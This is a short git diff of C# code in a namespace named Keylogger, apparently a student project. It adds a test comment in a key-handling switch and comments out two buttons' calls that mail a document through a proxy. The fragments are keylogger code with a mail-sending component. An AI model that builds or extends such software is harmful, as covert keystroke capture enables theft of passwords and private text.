@@ -236,6 +236,7 @@ namespace Keylogger
                        case "Lshiftkey":
                        case "lshiftkey":
                             msg = "";
+                            ///test comm for commits
                             break;
 
                        case "LCONTROLKEY":
@@ -339,14 +340,14 @@ namespace Keylogger
         {
             //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
             string path = "test";
-           _mailSender.SendMail(_proxy.GetDocument(path));
+           //_mailSender.SendMail(_proxy.GetDocument(path));
         }
 
         private void button3_Click(object sender, EventArgs e)
         {
             //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
             string path = "test";
-            _mailSender.SendMail(_proxy.GetDocument(path));
+            //_mailSender.SendMail(_proxy.GetDocument(path));
         }
     }
 }
